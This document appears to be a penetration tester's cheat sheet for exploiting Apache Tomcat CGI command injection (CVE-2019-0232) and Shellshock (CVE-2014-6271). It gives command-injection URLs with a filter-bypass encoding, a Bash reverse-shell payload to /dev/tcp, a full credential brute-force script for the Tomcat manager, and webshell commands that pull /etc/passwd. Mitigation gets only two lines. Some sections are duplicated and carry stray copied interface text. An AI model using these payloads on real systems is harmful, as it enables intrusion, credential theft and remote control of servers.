**1. Tomcat RCE (CVE-2019-0232)**

- **Affected Software:** The vulnerability lies within specific versions of **Apache Tomcat**

### **1. Tomcat CGI Scripts & RCE (CVE-2019-0232)**

This vulnerability targets specific versions of Apache Tomcat on Windows systems where the CGI Servlet's enableCmdLineArguments option is enabled. It arises from an input validation error, allowing an attacker to inject and execute arbitrary commands.

#### **Impact / What Can Be Achieved**

- **Remote Code Execution (RCE):** Attackers can execute arbitrary commands on the underlying Windows operating system with the privileges of the Tomcat service account.
- **System Compromise:** This can lead to a full system compromise, allowing the attacker to read, write, or delete files, install malware, or pivot to other systems on the network.

#### **Affected Tomcat Versions**

- 9.0.0.M1 to 9.0.17
- 8.5.0 to 8.5.39
- 7.0.0 to 7.0.93

#### **Quick Steps / Summary**

1.  **Enumerate Tomcat Version:**
    - Use nmap to identify the service and version on common ports like 8080.
            `nmap -p 8080 -sV -sC <TARGET_IP>`

2.  **Find CGI Scripts:**
    - The default directory for CGI scripts is /cgi-bin/ or /cgi/.
    - Use a tool like ffuf to fuzz for common script extensions like .bat or .cmd on Windows.

```
#     Fuzz for .bat scripts
ffuf -w /path/to/wordlist.txt -u http://<TARGET_IP>:8080/cgi/FUZZ.bat
 # Fuzz for .cmd scripts
 ffuf -w /path/to/wordlist.txt -u http://<TARGET_IP>:8080/cgi/FUZZ.cmd`
```

3.  **Exploit the Vulnerability:**
    - Once a script is found (e.g., welcome.bat), append a ?& followed by your command to the URL.
    - **Test with a simple command:**
            `http://<TARGET_IP>:8080/cgi/welcome.bat?&dir`
    - **Check environment variables:**
            `http://<TARGET_IP>:8080/cgi/welcome.bat?&set`
    - **Execute a specific command:** If the PATH variable is not set, you may need to provide the full path to the executable.
            `http://<TARGET_IP>:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe`
    - **Bypass Patches:** If the server has been patched, URL-encode the payload to bypass filters.
            `http://<TARGET_IP>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`

---

### **2. Shellshock via CGI Scripts (CVE-2014-6271)**

The Shellshock vulnerability affects older versions of Bash. It allows an attacker to execute arbitrary commands by crafting a malicious function definition within an environment variable, which is then passed to a CGI script.

#### **Impact / What Can Be Achieved**

- **Remote Code Execution (RCE):** An attacker can run commands with the permissions of the web server user.
- **Reverse Shell:** This often leads to gaining a reverse shell, providing interactive access to the server.
- **Further Network Pivoting:** The compromised host can be used as a staging point to attack other internal network resources.

#### **Quick Steps / Summary**

1. **Enumerate CGI Scripts:**
   - Use tools like gobuster to find CGI scripts (e.g., files with a .cgi extension).

`gobuster dir -u http://<TARGET_IP>/cgi-bin/ -w /path/to/wordlist.txt -x cgi`

2. **Confirm the Vulnerability:**
   - Use curl to send a crafted User-Agent string to a discovered CGI script. The payload () { :; }; is the key to triggering the vulnerability.
   - Attempt to execute a simple command like echo or cat /etc/passwd.

`curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://<TARGET_IP>/cgi-bin/script.cgi`

- A vulnerable system will execute the command and return its output in the HTTP response.

3. **Exploitation to Reverse Shell:**
   - **Set up a listener:** On your attacker machine, start a netcat listener on your chosen port.

`sudo nc -lvnp <LISTENER_PORT>`

- **Send the reverse shell payload:** Craft a curl request with a Bash reverse shell payload in the User-Agent header.
        code Shell

        downloadcontent_copy

        expand_less

            `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<YOUR_IP>/<LISTENER_PORT> 0>&1' http://<TARGET_IP>/cgi-bin/script.cgi`



  - You should receive a connection back on your netcat listener.

---

### **Mitigation**

- **CVE-2019-0232:** Update to a patched version of Apache Tomcat.
- **Shellshock:** Upgrade the Bash version on the server. If upgrading is not possible, consider network segmentation or decommissioning the affected host.

---

### APACHE TOMCAT

#### bruteforcing logins:

run:

```shell-session
$ python3 mgr_brute.py -U http://web01.ad.someorg.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code
```

This is a very straightforward script that takes a few arguments. We can run the script with `-h` to see what it requires to run.

---

### Tomcat webshells:

https://github.com/p0dalirius/Tomcat-webshell-application

### version

select either 9 or 10 war files in toolss folder/.

## send commands after install

```
$ curl -X POST 'http://127.0.0.1:10080/webshell/api.java' --data "action=exec&cmd=id"
{"stdout":"uid=0(root) gid=0(root) groups=0(root)\n","stderr":"","exec":["/bin/bash","-c","id"]}
```

### file download

### Downloading files

You can also download remote files by sending a GET or POST request to [http://127.0.0.1:10080/webshell/api.java](http://127.0.0.1:10080/webshell/api.java) with `action=download&cmd=/etc/passwd`:

```shell
$ curl -X POST 'http://127.0.0.1:10080/webshell/api.java' --data "action=download&path=/etc/passwd" -o-
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

## upgrade shell

console.py

```
python3 console.py -t <target:port>
> whoami
```

---

# shellshock

**Shellshock (CVE-2014-6271 and related CVEs)**

- **Affected Software:** This is a vulnerability in the **GNU Bash shell**

### **In Summary:**

|                         |                                                                                  |                                                                                                                                                          |
| ----------------------- | -------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Feature                 | Tomcat RCE (CVE-2019-0232)                                                       | Shellshock (CVE-2014-6271)                                                                                                                               |
| **Vulnerable Software** | Apache Tomcat                                                                    | GNU Bash shell                                                                                                                                           |
| **Operating System**    | Windows only                                                                     | Linux and Unix-like systems                                                                                                                              |
| **Core Problem**        | Improper handling of command-line arguments by Tomcat's CGI Servlet and the JRE. | Incorrect parsing of functions within environment variables by Bash.                                                                                     |
| **Exploitation Method** | Injecting OS commands directly into the URL parameters of a CGI script request.  | Placing a malicious function definition in an HTTP header (or other vector) that gets passed as an environment variable to a CGI script running on Bash. |

### **2. Shellshock via CGI Scripts (CVE-2014-6271)**

The Shellshock vulnerability affects older versions of Bash. It allows an attacker to execute arbitrary commands by crafting a malicious function definition within an environment variable, which is then passed to a CGI script.

#### **Impact / What Can Be Achieved**

- **Remote Code Execution (RCE):** An attacker can run commands with the permissions of the web server user.
- **Reverse Shell:** This often leads to gaining a reverse shell, providing interactive access to the server.
- **Further Network Pivoting:** The compromised host can be used as a staging point to attack other internal network resources.

#### **Quick Steps / Summary**

1. **Enumerate CGI Scripts:**
   - Use tools like gobuster to find CGI scripts (e.g., files with a .cgi extension).

`gobuster dir -u http://<TARGET_IP>/cgi-bin/ -w /path/to/wordlist.txt -x cgi`

2. **Confirm the Vulnerability:**
   - Use curl to send a crafted User-Agent string to a discovered CGI script. The payload () { :; }; is the key to triggering the vulnerability.
   - Attempt to execute a simple command like echo or cat /etc/passwd.

`curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://<TARGET_IP>/cgi-bin/script.cgi`

- A vulnerable system will execute the command and return its output in the HTTP response.

3. **Exploitation to Reverse Shell:**
   - **Set up a listener:** On your attacker machine, start a netcat listener on your chosen port.

`sudo nc -lvnp <LISTENER_PORT>`

- **Send the reverse shell payload:** Craft a curl request with a Bash reverse shell payload in the User-Agent header.
        code Shell

        downloadcontent_copy

        expand_less

            `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<YOUR_IP>/<LISTENER_PORT> 0>&1' http://<TARGET_IP>/cgi-bin/script.cgi`



  - You should receive a connection back on your netcat listener.

---

### **Mitigation**

- **CVE-2019-0232:** Update to a patched version of Apache Tomcat.
- **Shellshock:** Upgrade the Bash version on the server. If upgrading is not possible, consider network segmentation or decommissioning the affected host.
